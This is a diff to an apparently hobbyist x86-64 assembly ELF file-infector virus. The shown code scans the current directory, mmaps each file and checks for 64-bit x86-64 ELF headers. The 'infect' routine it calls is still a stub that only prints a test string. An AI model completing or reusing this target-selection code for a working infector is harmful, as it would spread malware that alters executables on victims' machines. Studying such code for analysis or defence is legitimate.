@@ -12,7 +12,7 @@ section .bss
 	endstruc
 	
 	struc file_stat
-		.st_de			resq 1	;ID of dev containing file
+		.st_dev			resq 1	;ID of dev containing file
 		.st_ino			resq 1	;inode #
 		.st_mode		resq 1	;protection
 		.st_nlink		resq 1	;# of hard links
@@ -29,19 +29,25 @@ section .bss
 
 	struc elf_ehdr
 		.e_ident		resd 1		; unsigned char
-		.e_type			resb 1		; uint16_t
-		.e_machine		resb 1		; uint16_t
+		.ei_class		resb 1		; 
+		.ei_data		resb 1		; 
+		.ei_version		resb 1		; 
+		.ei_osabi		resb 1		; 
+		.ei_abiversion	resb 1		; 
+		.ei_padding		resb 6		; bytes 10-15
+		.e_type			resb 2		; uint16_t, bytes 16-17
+		.e_machine		resb 2		; uint16_t, bytes 18-19
 		.e_version		resw 1		; uint32_t
 		.e_entry		resq 1		; ElfN_Addr
         .e_phoff		resq 1		; ElfN_Off 
         .e_shoff		resq 1		; ElfN_Off 
         .e_flags		resw 1		; uint32_t 
-        .e_ehsize		resb 1		; uint16_t 
-        .e_phentsize	resb 1		; uint16_t 
-        .e_phnum		resb 1		; uint16_t 
-        .e_shentsize	resb 1		; uint16_t 
-        .e_shnum		resb 1		; uint16_t 
-        .e_shstrndx		resb 1		; uint16_t 
+        .e_ehsize		resb 2		; uint16_t 
+        .e_phentsize	resb 2		; uint16_t 
+        .e_phnum		resb 2		; uint16_t 
+        .e_shentsize	resb 2		; uint16_t 
+        .e_shnum		resb 2		; uint16_t 
+        .e_shstrndx		resb 2		; uint16_t 
 	endstruc
 
 	struc elf_phdr
@@ -112,12 +118,19 @@ checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
 
 check64pass db 'File is an ELFCLASS64!', 13, 10, 0
 check64passlen equ $-check64pass
+check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
+check64faillen equ $-check64fail
 
 checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
+checkarchpasslen equ $-checkarchpass
+checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
+checkarchfaillen equ $-checkarchfail
+
 
 ;****************************************************************************************
 
 elf_header: times 4 dq 0
+file_stat_temp: times 13 dq 0
 
 
 
@@ -209,7 +222,7 @@ _start:
 	;push r9
 	;pop rdi
 	mov rdi, rax
-	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 200 is location on the stack where we'll save our dirent struct
+	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
 	mov rax, SYS_GETDENTS64
 	syscall
@@ -283,8 +296,9 @@ check_file:
 	push rcx
 	;nvm d_type might not be available; use the macros for fstat instead
 	;cmp byte [rcx + r14 + 600 + linuxdirent.d_type + 1], DT_REG
+;	cmp byte [rcx + r14 + 600 + linuxdirent.d_type ], DT_REG
 	;cmp byte [rcx + r14 + 600 + linuxdirent.d_reclen - 1], DT_REG
-	;jne checknext 
+;	jne checknext 
 	check_elf:
 	;	push rcx
 		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
@@ -293,6 +307,8 @@ check_file:
 		mov rax, SYS_OPEN
 		syscall
 
+		cmp rax, 0
+		jb checknext
 ;		test rax, rax
 ;		js checknext
 		
@@ -320,6 +336,7 @@ check_file:
 		push r9
 	get_filestat:
 		lea rsi, [r14 + file_stat]
+		;lea rsi, [file_stat_temp]
 		mov rdi, r8
 		;mov rdi, [fd]
 		mov rax, SYS_FSTAT
@@ -327,18 +344,20 @@ check_file:
 	
 		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
 		; since this is so annoying, I'm skipping this check for rn
-		;;mov r10, [r14 +file_stat.st_mode]
+	
+		;mov r12, checkfiledtreg_fail_len
+		;lea r13, checkfile_dtreg_fail
+		
+		;mov r10, [r14 + file_stat.st_mode]
 		;mov [mode], r10
 		;mov r10, S_ISREG(r10)
 		;cmp S_ISREG, S_IFREG	
 		;cmp r10, 0x1
 		;mov rax, [r14+file_stat.st_mode]
-		;and r10, S_IFMT
-		;mov r9, S_IFREG
+		;and r10, [S_IFMT]
+		;mov r9, [S_IFREG]
 		;cmp r10, r9
 		
-		;mov r12, checkfiledtreg_fail_len
-		;lea r13, checkfile_dtreg_fail
 		
 		;jne checknext
 		
@@ -346,17 +365,23 @@ check_file:
 		;                  int fd, off_t offset);
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
-		mov rsi, [r14 + file_stat.st_size]
+		mov qword rsi, [r14 + file_stat.st_size]
+		;mov qword rsi, [file_stat_temp + 56]
+		;mov rsi, [file_stat_temp + 56]
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
 		mov r10, MAP_PRIVATE
 		;mov r8, r9
-		mov r8, fd
+		;mov r8, fd				;fd is already in r8 so this mov is unnecessary
 		xor r9, r9				;offset of 0 within file == start of file, obv	
 		mov rax, SYS_MMAP
 		syscall
-			
+		
+		cmp rax, 0
+		jb checknext
+	
 		mov r8, rax
-		mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
+		;mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
+		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
 		pop r9
 		push rax
 	read_elf_header:
@@ -385,25 +410,37 @@ check_file:
 		;lea r13, [rax + elf_ehdr.e_ident]
 		;mov r12, 8
 		mov r12, checkelffaillen
+		;cmp dword [r14 + 800 + elf_ehdr.e_ident], 0x464c457f
 		;cmp dword [r8 + elf_ehdr.e_ident], 0x464c457f
+		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
 	
 		;lea rax, elf_header
 		;cmp dword [rax], 0x464c457f
-		cmp dword [elf_header], 0x464c457f
+		;cmp dword [elf_header], 0x464c457f
 		jnz checknext
 		lea r13, checkelfpass
 		mov r12, checkelfpasslen
 		call _write
 	check_elf_header_64bit:
-		cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
+		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
+		lea r13, check64fail
+		mov r12, check64faillen
+		cmp byte [elf_header+4], ELFCLASS64
 		jne checknext
 		lea r13, check64pass
 		mov r12, check64passlen
 		call _write
-		jmp _restore
+;		jmp _restore
 	
-;		check_elf_header_arch:
-;			jne checknext
+	check_elf_header_arch:
+		lea r13, checkarchfail
+		mov r12, checkarchfaillen
+		cmp byte [elf_header+18], 0x3e
+		jne checknext
+		lea r13, checkarchpass
+		mov r12, checkarchpasslen
+		call _write
+		jmp _restore
 		
 ;		ready2infect:
 ;			call infect	
@@ -422,6 +459,12 @@ check_file:
 		jne check_file
 		jmp _restore
 			
+;****************************************************************************************
+;	Infection routine:
+;
+;
+;****************************************************************************************
+
 infect:
 	jmp printteststr
 	
